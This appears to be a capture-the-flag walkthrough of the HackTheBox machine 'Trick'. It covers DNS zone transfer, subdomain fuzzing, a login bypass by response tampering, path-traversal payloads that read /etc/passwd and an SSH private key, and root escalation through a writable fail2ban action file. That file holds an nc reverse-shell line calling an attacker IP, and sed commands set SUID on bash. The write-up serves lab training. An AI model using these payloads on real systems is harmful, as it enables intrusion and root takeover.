## Trick 🔮
`IP address: 10.10.11.166`

`OS: Linux`

Enumeration is the key when you come to this box. It has also a lot of rabbit holes, which could be very "tricky" and you easily get lost.

### Discovering the service

The old boy, `nmap` scanned the whole TCP and UDP range and it found the following services:

```
TCP:

22/tcp open ssh syn-ack
25/tcp open smtp syn-ack
53/tcp open domain syn-ack
80/tcp open http syn-ack

UDP:

53/udp open domain udp-response ttl 63
```

Usually the webapps are the initial attack surface of the boxes and people can start the job on web applications, so did I. Found nothing, template app, no input fields or login page. Moving on to the SMTP service, but it was also a dead end. Something has to be vulnerably and my gut feelings said it is the DNS service, not the SSH.

Available Tools:
- dig
- nslookup
- host
- nmap

Here is a one-liner to collect the DNS related nmap scripts:

`ls /usr/share/nmap/scripts | grep dns | cut -d'.' -f 1 | tr '\n' ',' | sed 's/.$//'`

And the output:

`broadcast-dns-service-discovery,dns-blacklist,dns-brute,dns-cache-snoop,dns-check-zone,dns-client-subnet-scan,dns-fuzz,dns-ip6-arpa-scan,dns-nsec3-enum,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zeustracker,dns-zone-transfer,fcrdn`

So it can be used in the nmap scripts:

`nmap -vvvv script=broadcast-dns-service-discovery,dns-blacklist,dns-brute,dns-cache-snoop,dns-check-zone,dns-client-subnet-scan,dns-fuzz,dns-ip6-arpa-scan,dns-nsec3-enum,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zeustracker,dns-zone-transfer,fcrdn $IP_ADDRESS -p 53`

But no valuable information found in the output, so manual enum was performed successfully:

```
nslookup
> SERVER 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
166.11.10.10.in-addr.arpa	name = trick.htb.
```

Okay, that's something. Let's add it to the `/etc/resolv.conf`:
`nameserver 10.10.11.166`

New DNS server was added to the resolve config, now we can query the DNS server. And one of the most juicy thing what a hacker can do is DNS zone transfer (AXFR). So I tried:

```
dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 44 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Mon Jul 04 11:37:22 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```
Fine, a new subdomain came out. After it was added to the `hosts` file and fired up in the browser (`http://preprod-payroll.trick.htb`) a new web application welcomed. It has a login page, therefore a dirbuster scan was run without luck. Before moving on I took a closer look at the login page and it was very interesting:

```javascript
<script>
	$('#login-form').submit(function(e){
		e.preventDefault()
		$('#login-form button[type="button"]').attr('disabled',true).html('Logging in...');
		if($(this).find('.alert-danger').length > 0 )
			$(this).find('.alert-danger').remove();
		$.ajax({
			url:'ajax.php?action=login',
			method:'POST',
			data:$(this).serialize(),
			error:err=>{
				console.log(err)
		$('#login-form button[type="button"]').removeAttr('disabled').html('Login');

			},
			success:function(resp){
				if(resp == 1){
					location.href ='index.php?page=home';
				}else if(resp == 2){
					location.href ='voting.php';
				}else{
					$('#login-form').prepend('<div class="alert alert-danger">Username or password is incorrect.</div>')
					$('#login-form button[type="button"]').removeAttr('disabled').html('Login');
				}
			}
		})
	})
</script>
```
What we needed here is just a big 1. If the response contained 1 (successful authentication) it navigated the browser to the home page.
Burp was launch immediately and I rewrote the authentication probe response to `1` and it almost worked. The application still knew our session was never authorized to access the page, so it kept sending HTTP 302. To get rid of this annoying thing I did the following:

1. Intercept traffic
2. Catch the response
3. Modify the number to 1.
4. Modify the next response too:
5. HTTP Response: 200 OK
6. Remove location header

Putting these steps into auto-replace rules worked like a charm, however it was pointless. I was able to access and use the restricted pages, but it was a rabit hole.

Let's try to find subdomains:

`dnsrecon -D subdomains.txt -d trick.htb -t brt`

`python3 dnscan.py -d trick.htb. -w subdomains.txt -q -v`

None of them worked and here comes the trick. Approching the enumeration with another technique, you can use HTTP requests to identify subdomains. Plus one more important thing. It is always worth to use the prefixes during the domain name enum. For exmaple:

- dev
- uat
- int
- stage
- preprod
- prod

Here I kept the `preprod-` prefix and chose the proper tool for this job:

`wfuzz -c -w subdomains-10000.txt -u http://10.10.11.166 -H 'Host: preprod-FUZZ.trick.htb' --hh 5480`

With the `-H` switch we can add HTTP header to the requests. The `FUZZ` keyword is the placeholder and wfuzz will replace this keyword with the actual word provided in the wordlist.

`--hh` - hide responses with the specified chars. 

The 5480 is the character number of the error page when we use unkown host. During the scanning process wfuzz is spanning the output, therefore it is recommended to filter these findings. So the output look liked this:

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.166/
Total requests: 9985

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                    
=====================================================================

000000244:   200        178 L    631 W      9660 Ch     "marketing"                                                                                                                                                
000003734:   302        266 L    527 W      9546 Ch     "payroll"                                                                                                                                                  

Total time: 57.82799
Processed Requests: 9985
Filtered Requests: 9983
Requests/sec.: 172.6672
```

Another one! By adding `preprod-marketing.htb` to the `hosts` file it unlocked a new web application. Another one!
Navigating through the application, a suspicious attack surface could be noticed in the browser bar:

`http://preprod-marketing.trick.htb/index.php?page=about.html`


The `page` parameter might be a good surface. Since it is a PHP application, there is a little chance to LFI or RFI. Basic payloads did not work, we need something heavier here:

`dotdotpwn -m http-url -u http://preprod-marketing.trick.htb/index.php?page=TRAVERSAL -M GET -k root`

The method is pretty same as the previous one. Keyword subtitution and response comparison.

```
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd <- VULNERABLE
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/issue
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././etc/passwd <- VULNERABLE
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././etc/issue
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/passwd <- VULNERABLE
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/issue
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/passwd <- VULNERABLE
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/issue
```

Keeping eye on the results the users could be retrieved and one user seemed to be interesting:

`michael:x:1001:1001::/home/michael:/bin/bash`

[Wait a minute](https://youtu.be/cw9FIeHbdB8?t=5)🧐, the host using SSH.

It's time to figure out whether _michael_ has SSH access to the box.

`http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa`

Aaand he has: 👍🏾

```
#### micheal's key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Dump the key into a file and SSH to the server:

`ssh -vvv michael@10.10.11.116 -i privkey`

We got User privilege on the box:

```
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:~$ uname -a
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/Linux
michael@trick:~$ hostname
trick
```

### Rooting

Started the privilege escalation with [Linux Privesc Checker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py), however it did not really bring light to the situation. I saw a lot of `fail2ban` logs, so I started to investigate the `fail2ban` service and google was set on fire by my search queries. 

By listing the fail2ban config folder the following result returned:

```
michael@trick:~$ ls -l /etc/fail2ban/
total 60
drwxrwx--- 2 root security  4096 Jul  7 20:54 action.d
-rw-r--r-- 1 root root      2334 Jul  7 20:54 fail2ban.conf
drwxr-xr-x 2 root root      4096 Jul  7 20:54 fail2ban.d
drwxr-xr-x 3 root root      4096 Jul  7 20:54 filter.d
-rw-r--r-- 1 root root     22908 Jul  7 20:54 jail.conf
drwxr-xr-x 2 root root      4096 Jul  7 20:54 jail.d
-rw-r--r-- 1 root root       645 Jul  7 20:54 paths-arch.conf
-rw-r--r-- 1 root root      2827 Jul  7 20:54 paths-common.conf
-rw-r--r-- 1 root root       573 Jul  7 20:54 paths-debian.conf
-rw-r--r-- 1 root root       738 Jul  7 20:54 paths-opensuse.conf
```

You may notice the `action.d` folder has different group owner as the other files and dictioneries. It has a `security` group owner and michael belongs to this group. At this point it was pretty straightforward, and there are a few privesc tutorials on the internet, which described the whole rooting process. 

Just a few word about the `fail2ban` service:

*Fail2ban is an intrusion prevention software framework that protects computer servers from brute-force attacks. Fail2ban scans log files (e.g. /var/log/httpd/error_log) and bans IPs that show the malicious signs like too many password failures, seeking for exploits, etc.*


**jail.conf** - config file. This config file describes the default banaction and individual banaction for every service.
**bantime** - cooldown time of the ban
**findtime** - Within this timeframe IPs are banned, which passed the *maxretry* threshold
**maxretry** - Maxiumum login tries in the 'findtime' period
**banaction** - The default action when a ban action was triggered
**actoion.d** - A folder which contains the banaction config files

It also turned out from the config files the SSH service was enabled in fail2ban.

Example:
- bantime: 10s
- findtime: 10s
- maxretry: 5
- banaction: iptables-multiport

To trigger the banaction you need to do 5 failed SSH login probe in 10 seconds. After that banaction tiggers and run the `iptables-multiport.conf` file, which defines the desired commands to run.

The default iptables-multiport.conf file:

```
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = /usr/bin/nc 10.10.14.42 443 -e /usr/bin/bash

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
```

Using the following command we can change the uniqe *actionban* of the above-mentioned action:

```
CMD='chmod +s /bin/bash'

sed -i -E "s\actionban =.*\actionban = $CMD\g" /etc/fail2ban/action.d/iptables-multiport.conf
sed -i -E "s\actionunban =.*\actionunban = $CMD\g" /etc/fail2ban/action.d/iptables-multiport.conf
cat /etc/fail2ban/action.d/iptables-multiport.conf
```

Now after 5 failed SSH login attempts, the actionban command will be executed and the bash binary gets a SUID bit.

Running the `/bin/bash` binary with the `-p` swtich and the SUID bit on it will result `root` access to the system.

To apply the modifications, we need to reload the service. At the beginning I tried to restart the fail2ban with the `systemctl` command. Michael had sudo, but I did not know which commands he had right to execute, because the sudoers file was restricted. So I started harvesting password from the DB connection string and from the database. None of them worked. And after some time I realised the `sudo -l` lists the allowed commands for the invoked user:

```
michael@trick:/etc/init.d$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

And here we go. Michael did not have right to execute the `systemctl` but he did have the right to run `/etc/init.d/fail2ban restart`.

So after the service restart, 5 failed SSH login attempts were made and the `bash` binary got the SUID bit:

```
bash-5.0# whoami
root
```

